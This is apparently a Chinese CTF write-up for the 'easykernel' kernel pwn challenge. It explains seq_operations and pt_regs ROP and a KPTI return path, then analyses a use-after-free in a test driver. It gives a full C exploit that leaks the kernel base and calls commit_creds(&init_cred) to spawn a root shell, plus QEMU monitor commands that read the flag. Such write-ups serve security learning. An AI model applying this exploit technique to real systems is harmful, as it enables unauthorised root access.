---
layout: post
title:  easykernel(西湖论剑2021)
date:   2025-01-04 00:08:01 +0300
image:  2025-01-04-woman.jpg
tags:   [ctf,Pwn,kernel,ROP]
---

### **seq_operations**

`seq_operations` 是一个十分有用的结构体，我们不仅能够通过它来泄露内核基址，还能利用它来控制内核执行流。

当我们打开一个 stat 文件时（如 `/proc/self/stat` ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于 `/include/linux/seq_file.h` 当中，只定义了四个函数指针，如下：

```assembly
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```

当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 `proc_read_iter` 指针，其默认值为 `seq_read_iter()` 函数，定义于 `fs/seq_file.c` 中，注意到有如下逻辑：

```assembly
ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
{
    struct seq_file *m = iocb->ki_filp->private_data;
    //...
    p = m->op->start(m, &m->index);
    //...
```

即其会调用 seq_operations 中的 start 函数指针，那么**我们只需要控制 seq_operations->start 后再读取对应 stat 文件便能控制内核执行流**

系统调用的本质是由我们在用户态布置好相应的参数后执行 `syscall` 这一汇编指令，通过门结构进入到内核中的 `entry_SYSCALL_64`这一函数，随后通过系统调用表跳转到对应的函数。

现在让我们将目光放到 `entry_SYSCALL_64` 这一用汇编写的函数内部，注意到当程序进入到内核态时，该函数会将所有的寄存器**压入内核栈上，形成一个 pt_regs 结构体**，该结构体实质上位于内核栈底，[定义](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44)如下：

```assembly
struct pt_regs {
/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled "struct pt_regs".
 */
    unsigned long r15;
    unsigned long r14;
    unsigned long r13;
    unsigned long r12;
    unsigned long rbp;
    unsigned long rbx;
/* These regs are callee-clobbered. Always saved on kernel entry. */
    unsigned long r11;
    unsigned long r10;
    unsigned long r9;
    unsigned long r8;
    unsigned long rax;
    unsigned long rcx;
    unsigned long rdx;
    unsigned long rsi;
    unsigned long rdi;
/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */
    unsigned long orig_rax;
/* Return frame for iretq */
    unsigned long rip;
    unsigned long cs;
    unsigned long eflags;
    unsigned long rsp;
    unsigned long ss;
/* top of stack page */
};
```

我们都知道，内核栈**只有一个页面的大小**，而 pt_regs 结构体则固定位于**内核栈栈底**，当我们劫持内核结构体中的某个函数指针时（例如 seq_operations->start），在我们通过该函数指针劫持内核执行流时 **rsp 与 栈底的相对偏移通常是不变的**。

而在系统调用当中过程有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15，**这些寄存器为我们布置 ROP 链提供了可能，我们不难想到：**

- **只需要寻找到一条形如 "add rsp, val ; ret" 的 gadget 便能够完成 ROP**

这里给出一个通用的 ROP 板子，方便调试时观察：

```assembly
__asm__(
    "mov r15,   0xbeefdead;"
    "mov r14,   0x11111111;"
    "mov r13,   0x22222222;"
    "mov r12,   0x33333333;"
    "mov rbp,   0x44444444;"
    "mov rbx,   0x55555555;"
    "mov r11,   0x66666666;"
    "mov r10,   0x77777777;"
    "mov r9,    0x88888888;"
    "mov r8,    0x99999999;"
    "xor rax,   rax;"
    "mov rcx,   0xaaaaaaaa;"
    "mov rdx,   8;"
    "mov rsi,   rsp;"
    "mov rdi,   seq_fd;"        // 这里假定通过 seq_operations->stat 来触发
    "syscall"
);
```

### 新版本内核对抗利用 pt_regs 进行攻击的办法 [¶](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2ptregs/#pt_regs_1)

正所谓魔高一尺道高一丈，内核主线在 [这个 commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=eea2647e74cd7bd5d04861ce55fa502de165de14) 中为系统调用栈**添加了一个偏移值，这意味着 pt_regs 与我们触发劫持内核执行流时的栈间偏移值不再是固定值**：

```assembly
diff --git a/arch/x86/entry/common.c b/arch/x86/entry/common.c
index 4efd39aacb9f2..7b2542b13ebd9 100644
--- a/arch/x86/entry/common.c
+++ b/arch/x86/entry/common.c
@@ -38,6 +38,7 @@
 #ifdef CONFIG_X86_64
 __visible noinstr void do_syscall_64(unsigned long nr, struct pt_regs *regs)
 {
+    add_random_kstack_offset();
     nr = syscall_enter_from_user_mode(regs, nr);

     instrumentation_begin();
```

当然，若是在这个随机偏移值较小且我们仍有足够多的寄存器可用的情况下，仍然可以通过布置一些 slide gadget 来继续完成利用，不过稳定性也大幅下降了。

首先查看启动脚本，可以发现开启了 SMEP 和 KASLR：

```assembly
#!/bin/sh

qemu-system-x86_64  \
-m 64M \
-cpu kvm64,+smep \
-kernel ./bzImage \
-initrd rootfs.img \
-nographic \
-s \
-append "console=ttyS0 kaslr quiet noapic"
```

没有使用`-monitor /dev/null`将monitor重定向，可以直接进入monitor导出docker中的文件系统

在启动qemu后点击`ctrl+a`后再按`c`即可进入monitor控制台

```assembly
migrate "exec:cp rootfs.img /tmp"
migrate "exec:cd /tmp;zcat rootfs.img | cpio -idmv 1>&2"
migrate "exec:cat /tmp/flag 1>&2"
```

进入题目环境，查看 `/sys/devices/system/cpu/vulnerabilities/*`，可以发现开启了 PTI （页表隔离）：

```assembly
/ $ cat /sys/devices/system/cpu/vulnerabilities/*
KVM: Mitigation: VMX unsupported
Mitigation: PTE Inversion
Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
Mitigation: PTI
Vulnerable
Mitigation: usercopy/swapgs barriers and __user pointer sanitization
Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
Not affected
Not affected
```

题目给了个 test.ko，拖入 IDA 进行分析

kerpwn_ioctl

```assembly
unsigned __int64 __fastcall kerpwn_ioctl(__int64 a1, __int64 a2)
{
  __int64 v2; // rdx
  unsigned __int64 result; // rax
  __int64 v4; // r12
  unsigned __int64 v5; // r13
  __int64 v6; // r14
  __int64 v7; // rax
  __int64 v8; // rbx
  unsigned __int64 v9; // r12
  unsigned __int64 v10; // r13
  __int64 v11; // rax
  unsigned __int64 v12; // [rsp-48h] [rbp-48h] BYREF
  unsigned __int64 v13; // [rsp-40h] [rbp-40h]
  __int64 v14; // [rsp-38h] [rbp-38h]
  unsigned __int64 v15; // [rsp-30h] [rbp-30h]

  _fentry__(a1, a2);
  v15 = __readgsqword(0x28u);
  result = 0LL;
  if ( (_DWORD)a2 == 0x40 )
  {
    if ( !copy_from_user(&v12, v2, 0x18LL) )
    {
      show(&v12);
      return 0LL;
    }
    return 0xFFFFFFFFFFFFFFEALL;
  }
  if ( (unsigned int)a2 > 0x40 )
  {
    if ( (_DWORD)a2 == 0x50 )                   // read
    {
      if ( copy_from_user(&v12, v2, 0x18LL) )
        return 0xFFFFFFFFFFFFFFEALL;
      if ( (unsigned int)v12 <= 0x20 )
      {
        v4 = addrList[(unsigned int)v12];
        if ( v4 )
        {
          v5 = v13;
          v6 = v14;
          if ( v13 <= 0x7FFFFFFF )
          {
            _check_object_size(addrList[(unsigned int)v12], v13, 0LL);
            copy_from_user(v4, v6, v5);
            return 0LL;
          }
LABEL_29:
          BUG();
        }
      }
    }
    return 0LL;
  }
  if ( (_DWORD)a2 != 0x20 )                     // <0x40
  {
    if ( (_DWORD)a2 != 0x30 )                   // 0x30
      return result;
    if ( !copy_from_user(&v12, v2, 8LL) )
    {
      if ( (unsigned int)v12 <= 0x20 )
      {
        if ( addrList[(unsigned int)v12] )
          kfree();
      }
      return 0LL;
    }
    return 0xFFFFFFFFFFFFFFEALL;
  }
  if ( copy_from_user(&v12, v2, 0x10LL) )
    return 0xFFFFFFFFFFFFFFEALL;
  if ( v12 > 0x20 )                             // 0x20
    return 0LL;
  v7 = _kmalloc(v12, 0xCC0LL);
  v8 = v7;
  if ( !v7 )
    return 0LL;
  v9 = v12;
  v10 = v13;
  if ( v12 > 0x7FFFFFFF )
    goto LABEL_29;
  _check_object_size(v7, v12, 0LL);
  v11 = copy_from_user(v8, v10, v9);
  if ( v11 )
    return 0LL;
  while ( addrList[v11] )
  {
    if ( ++v11 == 0x20 )
      return 0LL;
  }
  addrList[(int)v11] = v8;
  return 0LL;
}
```

**kfree 以后没有清空指针，存在UAF**

对于分配 object，我们需要传入如下形式结构体：

```assembly
struct
{
    size_t size;
    void *buf;
}
```

对于释放、读、写 object，则需要传入如下形式结构体：

```assembly
struct 
{
    size_t idx;
    size_t size;
    void *buf;
};
```

这里可以使用 `seq_operations` + `pt_regs` 构造 ROP 进行提权

题目的img为一个压缩的文件系统

将后缀改为gz后可以用gzip解压

```assembly
mv ./rootfs.img ./rootfs.gz
gzip -d ./rootfs.gz
mkdir extracted; cd extracted
cpio -i --no-absolute-filenames -F ../rootfs
```

### 获取偏移信息

找到文件系统中的`rcS`文件/`init`文件，从`setsid`这一行修改权限为0，然后将文件系统打包

start.sh加上`-s`，并关闭`kaslr`

启动内核后查看驱动的基地址

```assembly
/ # lsmod
1 16384 0 - Live 0xffffffffc028b000 (OE)
```

gdb添加符号

```
gdb ./test.ko
add-symbol-file ./test.ko 0xffffffffc031d000
```

> head /proc/kallsyms
>
> ......
>
> 000000000002e040 A kvm_apic_eoi
> 000000000002e080 A steal_time
> 000000000002e0c0 A apf_reason
> 000000000002f000 A __per_cpu_end
> ffffffffbc400000 T startup_64
> ffffffffbc400000 T _stext
> ffffffffbc400000 T _text
> ffffffffbc400030 T secondary_startup_64
> ffffffffbc4000f0 t verify_cpu
> ffffffffbc4001f0 T start_cpu0
>
> ......

得到动态运行的基地址是ffffffffbc400000

控制seq_operations结构体时泄露地址，计算偏移时发现`head /proc/kallsyms`找到的地址是从0开始的，找到`0xffffffffXXXXXXXX`式的地址来计算偏移

```assembly
cat /proc/kallsyms | grep "startup_64"
cat /proc/kallsyms | grep "prepare_kernel_cred"
cat /proc/kallsyms | grep "commit_creds"
```

泄露`seq_operations` 内容

```assembly
/ # ./exp
bc719d30
bc719d70
bc719d50
bc793390
/ # cat /proc/kallsyms | grep "bc719d30"
ffffffffbc719d30 t single_start
/ # cat /proc/kallsyms | grep "bc719d70"
ffffffffbc719d70 t single_stop
```

因此计算可以得到偏移

offset = ffffffffbc719d30-ffffffffbc400000

接下来寻找形如 "add rsp, val ; ret" 的 gadget 

```assembly
[----------------------------------registers-----------------------------------]
RAX: 0xffffffffb7f5b0f6 --> 0x5b00000180c48148
RBX: 0x0
RCX: 0x0
RDX: 0x0
RSI: 0xffff961441e0d910 --> 0x0
RDI: 0xffff961441e0d8e8 --> 0xffff9614408f2000 --> 0x0
RBP: 0xffffa885801d3e18 --> 0xffffa885801d3ea0 --> 0xffffa885801d3ee0 --> 0xffffa885801d3f20 --> 0xffffa885801d3f30 --> 0xffffa885801d3f48 (--> ...)
RSP: 0xffffa885801d3db8 --> 0xffffffffb7f1aa6e --> 0x850fc08548c78949
RIP: 0xffffffffb7f5b0f6 --> 0x5b00000180c48148
R8 : 0xffff9614438311a0 --> 0xffff9614408f4000 --> 0x0
R9 : 0xffff961443402700 --> 0x311a0
R10: 0xffff9614408f2000 --> 0x0
R11: 0x0
R12: 0xffffa885801d3e60 --> 0xffff961442b20a00 --> 0x0
R13: 0xffff961441e0d8e8 --> 0xffff9614408f2000 --> 0x0
R14: 0xffff961441e0d910 --> 0x0
R15: 0x7ffc794eb2f0 --> 0x4c7240 --> 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xffffffffb7f5b0e3:  mov    rcx,QWORD PTR [rbp-0x28]
   0xffffffffb7f5b0e7:  xor    rcx,QWORD PTR gs:0x28
   0xffffffffb7f5b0f0:  jne    0xffffffffb7f5b1bf
=> 0xffffffffb7f5b0f6:  add    rsp,0x180
   0xffffffffb7f5b0fd:  pop    rbx
   0xffffffffb7f5b0fe:  pop    r12
   0xffffffffb7f5b100:  pop    r13
   0xffffffffb7f5b102:  pop    r14
[------------------------------------stack-------------------------------------]
0000| 0xffffa885801d3db8 --> 0xffffffffb7f1aa6e --> 0x850fc08548c78949
0008| 0xffffa885801d3dc0 --> 0x9 ('\t')
0016| 0xffffa885801d3dc8 --> 0x0
0024| 0xffffa885801d3dd0 --> 0x20000b90c4a01
0032| 0xffffa885801d3dd8 --> 0xffffa885801d3e38 --> 0xffff961400000004
0040| 0xffffa885801d3de0 --> 0x8
0048| 0xffffa885801d3de8 --> 0xffff961441e0d920 --> 0xffff961440960000 --> 0x0
0056| 0xffffa885801d3df0 --> 0xffffa885801d3ef0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xffffffffb7f5b0f6 in ?? ()
gdb-peda$ x/70gx $rsp
0xffffa885801d3db8:     0xffffffffb7f1aa6e      0x0000000000000009
0xffffa885801d3dc8:     0x0000000000000000      0x00020000b90c4a01
0xffffa885801d3dd8:     0xffffa885801d3e38      0x0000000000000008
0xffffa885801d3de8:     0xffff961441e0d920      0xffffa885801d3ef0
0xffffa885801d3df8:     0x0000000000000000      0xffff961442b20a00
0xffffa885801d3e08:     0xffffa885801d3ef0      0x00007ffc794eb2f0
0xffffa885801d3e18:     0xffffa885801d3ea0      0xffffffffb7f1af19
0xffffa885801d3e28:     0x00007ffc794eb2f0      0x0000000000000008
0xffffa885801d3e38:     0xffff961400000004      0x0000000000000000
0xffffa885801d3e48:     0x0000000000000008      0xffffa885801d3e28
0xffffa885801d3e58:     0x0000000000000001      0xffff961442b20a00
0xffffa885801d3e68:     0x0000000000000000      0x0000000000000000
0xffffa885801d3e78:     0x0000000000000000      0x0000000000000000
0xffffa885801d3e88:     0x0000000000000000      0x06bbe84e83866b00
0xffffa885801d3e98:     0x0000000000000008      0xffffa885801d3ee0
0xffffa885801d3ea8:     0xffffffffb7eeca9a      0x00000001004cdc20
0xffffa885801d3eb8:     0xffff961442b20a00      0xffff961442b20a00
0xffffa885801d3ec8:     0x00007ffc794eb2f0      0x0000000000000008
0xffffa885801d3ed8:     0x0000000000000000      0xffffa885801d3f20
0xffffa885801d3ee8:     0xffffffffb7eef367      0x0000000000000000
0xffffa885801d3ef8:     0x06bbe84e83866b00      0x0000000000000000
0xffffa885801d3f08:     0xffffa885801d3f58      0x0000000000000000
0xffffa885801d3f18:     0x0000000000000000      0xffffa885801d3f30
0xffffa885801d3f28:     0xffffffffb7eef3fa      0xffffa885801d3f48
0xffffa885801d3f38:     0xffffffffb8771fe9      0x0000000000000000  // pop rbx, pop r12
0xffffa885801d3f48:     0x0000000000000000      0xffffffffb880008c  // pop r13, pop r14
0xffffa885801d3f58:     0x00000000beefdead      0x0000000011111111  // pop rbp, ret
0xffffa885801d3f68:     0x0000000022222222      0x0000000033333333
0xffffa885801d3f78:     0x0000000044444444      0x0000000055555555
0xffffa885801d3f88:     0x0000000000000246      0x0000000077777777
0xffffa885801d3f98:     0x0000000088888888      0x0000000099999999
0xffffa885801d3fa8:     0xffffffffffffffda      0x0000000000401ab6
0xffffa885801d3fb8:     0x0000000000000008      0x00007ffc794eb2f0
0xffffa885801d3fc8:     0x0000000000000004      0x0000000000000000
0xffffa885801d3fd8:     0x0000000000401ab6      0x0000000000000033
```

我们此前比较朴素的提权思想就是 `commit_creds(prepare_kernel_cred(NULL))`了，但是存在一个问题：**我们无法控制seq_operations->start 的参数**，且我们单次只能执行一个函数，而朴素的提权思想则要求我们连续执行两个函数

关于后者这个问题其实不难解决，在内核当中有一个特殊的 cred —— `init_cred`，这是 init 进程的 cred，因此**其权限为 root**，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次 `commit_creds(&init_cred)` 便能完成提权。

**KPTI bypass**

找到合适的 gadget 完成 ROP 链的构造之后，我们接下来要考虑如何“完美地降落回用户态”

还是让我们将目光放到系统调用的汇编代码中，我们发现内核也相应地在 `arch/x86/entry/entry_64.S` 中提供了一个用于完成内核态到用户态切换的函数 `swapgs_restore_regs_and_return_to_usermode`

源码的 AT&T 汇编比较反人类，推荐直接查看 IDA 的反汇编结果

```assembly
.text:FFFFFFFF81C00F30 swapgs_restore_regs_and_return_to_usermode proc near
.text:FFFFFFFF81C00F30                                         ; CODE XREF: ret_from_fork+15↑j
.text:FFFFFFFF81C00F30                                         ; entry_SYSCALL_64_after_hwframe+54↑j ...
.text:FFFFFFFF81C00F30                 pop     r15             ; Alternative name is '__irqentry_text_end'
.text:FFFFFFFF81C00F32                 pop     r14
.text:FFFFFFFF81C00F34                 pop     r13
.text:FFFFFFFF81C00F36                 pop     r12
.text:FFFFFFFF81C00F38                 pop     rbp
.text:FFFFFFFF81C00F39                 pop     rbx
.text:FFFFFFFF81C00F3A                 pop     r11
.text:FFFFFFFF81C00F3C                 pop     r10
.text:FFFFFFFF81C00F3E                 pop     r9
.text:FFFFFFFF81C00F40                 pop     r8
.text:FFFFFFFF81C00F42                 pop     rax
.text:FFFFFFFF81C00F43                 pop     rcx
.text:FFFFFFFF81C00F44                 pop     rdx
.text:FFFFFFFF81C00F45                 pop     rsi
.text:FFFFFFFF81C00F46                 mov     rdi, rsp
.text:FFFFFFFF81C00F49                 mov     rsp, gs:qword_6004
.text:FFFFFFFF81C00F52                 push    qword ptr [rdi+30h]
.text:FFFFFFFF81C00F55                 push    qword ptr [rdi+28h]
.text:FFFFFFFF81C00F58                 push    qword ptr [rdi+20h]
.text:FFFFFFFF81C00F5B                 push    qword ptr [rdi+18h]
.text:FFFFFFFF81C00F5E                 push    qword ptr [rdi+10h]
.text:FFFFFFFF81C00F61                 push    qword ptr [rdi]
.text:FFFFFFFF81C00F63                 push    rax
.text:FFFFFFFF81C00F64                 jmp     short loc_FFFFFFFF81C00FA9
…………

.text:FFFFFFFF81C00FA9 loc_FFFFFFFF81C00FA9:                   ; CODE XREF: swapgs_restore_regs_and_return_to_usermode+34↑j
.text:FFFFFFFF81C00FA9                 pop     rax
.text:FFFFFFFF81C00FAA                 pop     rdi
.text:FFFFFFFF81C00FAB                 call    cs:off_FFFFFFFF82641B28
…………
.data:FFFFFFFF82641B28 off_FFFFFFFF82641B28 dq offset native_swapgs
.data:FFFFFFFF82641B28                                         ; DATA XREF: swapgs_restore_regs_and_return_to_usermode+7B↑r
.data:FFFFFFFF82641B28                                         ; native_irq_return_ldt+1↑r ...
…………
.text:FFFFFFFF81075EF0 native_swapgs   proc near               ; CODE XREF: x86_perf_event_update+41↑p
.text:FFFFFFFF81075EF0                                         ; x86_pmu_disable_all+91↑p ...
.text:FFFFFFFF81075EF0                 swapgs
.text:FFFFFFFF81075EF3                 retn
.text:FFFFFFFF81075EF3 native_swapgs   endp
```

在实际操作时前面的一些栈操作都可以跳过，直接从 `mov rdi, rsp` 开始，这个函数大概可以总结为如下操作：

```assembly
mov      rdi, cr3
or       rdi, 0x1000
mov      cr3, rdi
pop      rax
pop      rdi
swapgs
iretq
```

因此我们只需要布置出如下栈布局即可**完美降落回用户态**：

```assembly
swapgs_restore_regs_and_return_to_usermode
0 // padding
0 // padding
user_shell_addr
user_cs
user_rflags
user_sp
user_ss
```

### exp

```assembly
#include <fcntl.h>
#include <stddef.h>

// #define COMMIT_CREDS_OFFSET (0xffffffffb84c8d40 - 0xffffffffb8400000)
#define COMMIT_CREDS_OFFSET (0xFFFFFFFF8109A33C - 0xffffffff81000000)
// #define PREPARE_KERNEL_CRED (0xffffffffb84c91d0 - 0xffffffffb8400000)

#define INIT_CRED_OFFSET (0xffffffffb4463300 - 0xffffffffb2e00000)
// #define INIT_CRED_OFFSET (0xffffffff82663300  - 0xffffffff81000000)
#define POP_RDI_RET_OFFSET (0xffffffff81089250 - 0xffffffff81000000)
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE_OFFSET (0xffffffff81c00f30 - 0xffffffff81000000)

long dev_fd;


typedef struct op_chunk{
    size_t  idx;
    size_t  size;
    void    *buf;
} OP_CHUNK;


typedef struct alloc_chunk{
    size_t  size;
    void    *buf;
} ALLOC_CHUNK;


void readChunk(size_t idx, size_t size, void *buf){
    OP_CHUNK op = 
    {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x40, &op);
}


void writeChunk(size_t idx, size_t size, void *buf){
    OP_CHUNK op = 
    {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x50, &op);
}


void deleteChunk(size_t idx){
    OP_CHUNK op = 
    {
        .idx = idx,
    };
    ioctl(dev_fd, 0x30, &op);
}


void allocChunk(size_t size, void *buf){
    ALLOC_CHUNK alloc = 
    {
        .size = size,
        .buf = buf,
    };
    ioctl(dev_fd, 0x20, &alloc);
}


size_t  buf[0x100];
long    seq_fd;
size_t init_cred;
size_t pop_rdi_ret;
size_t commit_creds;
size_t swapgs_restore_regs_and_return_to_usermode;


int main(int argc, char ** argv, char ** envp){

    dev_fd = open("/dev/kerpwn", O_RDWR);
    if(dev_fd < 0){
        puts("[*]open /dev/kerpwn error!");
    }

    allocChunk(0x20, buf);
    deleteChunk(0);  // UAF
    seq_fd = open("/proc/self/stat", O_RDONLY);
    readChunk(0, 0x20, buf);

    printf("%x\n", buf[0]);
    // printf("%x\n", buf[1]);
    // printf("%x\n", buf[2]);
    // printf("%x\n", buf[3]);

    /*
        / # ./exp
        bc719d30
        bc719d70
        bc719d50
        bc793390
        / # cat /proc/kallsyms | grep "bc719d30"
        ffffffffbc719d30 t single_start
        / # cat /proc/kallsyms | grep "bc719d70"
        ffffffffbc719d70 t single_stop
    */

    int offset = 0xffffffffbc719d30 - 0xffffffffbc400000;
    int kernel_base = buf[0] + 0xffffffff00000000 - offset;

    printf("%x\n", kernel_base);


    /*
    .text:FFFFFFFF8135B0F6                 add     rsp, 180h
    .text:FFFFFFFF8135B0FD                 pop     rbx
    .text:FFFFFFFF8135B0FE                 pop     r12
    .text:FFFFFFFF8135B100                 pop     r13
    .text:FFFFFFFF8135B102                 pop     r14
    .text:FFFFFFFF8135B104                 pop     rbp
    .text:FFFFFFFF8135B105                 retn
    */
    size_t gadget = 0xffffffff8135b0f6 - 0xffffffff81000000 + kernel_base; // add rsp 一个数然后 pop 一堆寄存器最后ret
    buf[0] = gadget;
    printf("%x\n", gadget);
    writeChunk(0, 0x20, buf);

    // __asm__(
    //     "mov r15,   0xbeefdead;"
    //     "mov r14,   0x11111111;"
    //     "mov r13,   0x22222222;"
    //     "mov r12,   0x33333333;"
    //     "mov rbp,   0x44444444;"
    //     "mov rbx,   0x55555555;"
    //     "mov r11,   0x66666666;"
    //     "mov r10,   0x77777777;"
    //     "mov r9,    0x88888888;"
    //     "mov r8,    0x99999999;"
    //     "xor rax,   rax;"
    //     "mov rcx,   0xaaaaaaaa;"
    //     "mov rdx,   8;"
    //     "mov rsi,   rsp;"
    //     "mov rdi,   seq_fd;"        // 这里假定通过 seq_operations->stat 来触发
    //     "syscall"
    // );


    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE_OFFSET + kernel_base;
    init_cred = INIT_CRED_OFFSET + kernel_base;
    pop_rdi_ret = POP_RDI_RET_OFFSET + kernel_base;
    commit_creds = COMMIT_CREDS_OFFSET + kernel_base;


    swapgs_restore_regs_and_return_to_usermode += 9;

    __asm__(
        "mov r15, 0xbeefdead;"
        "mov r14, pop_rdi_ret;"
        "mov r13, init_cred;"
        "mov r12, commit_creds;"
        "mov rbp, swapgs_restore_regs_and_return_to_usermode;"
        "mov rbx, 0x999999999;"
        "mov r11, 0x114514;"
        "mov r10, 0x666666666;"
        "mov r9, 0x1919114514;"
        "mov r8, 0xabcd1919810;"
        "xor rax, rax;"
        "mov rcx, 0x666666;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, seq_fd;"
        "syscall"
    );

    system("/bin/sh");

    return 0;
}
```

参考：

https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2ptregs/

https://www.anquanke.com/post/id/260055#h3-6